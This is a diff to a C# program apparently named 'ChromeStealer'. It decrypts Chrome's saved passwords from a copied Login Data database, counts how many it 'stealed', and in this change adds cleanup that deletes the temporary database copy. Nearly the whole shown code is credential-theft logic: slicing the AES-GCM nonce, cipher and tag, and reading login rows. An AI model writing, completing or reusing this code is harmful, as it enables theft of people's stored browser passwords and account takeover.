@@ -55,9 +55,7 @@ namespace ChromeStealer
             var cipher = encryptedPasswordSpan[15..^16];
             var tag = encryptedPasswordSpan[^16..];
             
-            // var nonceSize = BinaryPrimitives.ReadInt32LittleEndian(nonce);
             var cipherSize = cipher.Length;
-            // var tagSize = BinaryPrimitives.ReadInt32LittleEndian(tag);
 
             var plainTextBytes = cipherSize < 1024
                 ? stackalloc byte[cipherSize]
@@ -82,8 +80,7 @@ namespace ChromeStealer
                 var adapter = new SQLiteDataAdapter(command);
                 adapter.Fill(dataTable);
             }
-            //File.Delete(LoginDataTempFilePath);
-            
+
             var passwordsCount = (Successes: 0, Fails: 0, Empty: 0);
             
             var rows = dataTable.Rows.Count;
@@ -127,6 +124,15 @@ namespace ChromeStealer
             }
             
             Console.WriteLine($"Passwords stealed: {passwordsCount.Successes}, empty: {passwordsCount.Empty}, fails: {passwordsCount.Fails}.");
+
+            try
+            {
+                File.Delete(LoginDataTempFilePath);
+            }
+            catch (Exception exception)
+            {
+                Console.WriteLine($"Unable to delete temp database file:\n{exception}");
+            }
             
             return loginData;
         }
